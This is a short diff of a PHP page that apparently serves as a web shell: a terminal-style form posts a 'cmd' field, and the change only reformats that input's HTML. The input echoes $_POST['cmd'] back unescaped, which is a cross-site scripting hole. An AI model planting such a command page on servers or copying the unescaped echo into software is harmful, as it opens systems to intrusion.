@@ -91,10 +91,7 @@ if (!empty($_POST["cmd"])) {
               <strong>~</strong>
               <strong>]</strong>
             </label>
-            <div class="line1">
-              <p>└─</p>
-              <p>$</p>
-              <input name="cmd" id="cmd" type="text" class="form-control" value="<?php if(isset($_POST['cmd'])){ echo $_POST['cmd']; } ?>" required="">
+            <div class="line1"><p>└─</p><p>$</p><input name="cmd" id="cmd" type="text" class="form-control" value="<?php if(isset($_POST['cmd'])){ echo $_POST['cmd']; } ?>" required="">
             </div>
           </div>
         </form>
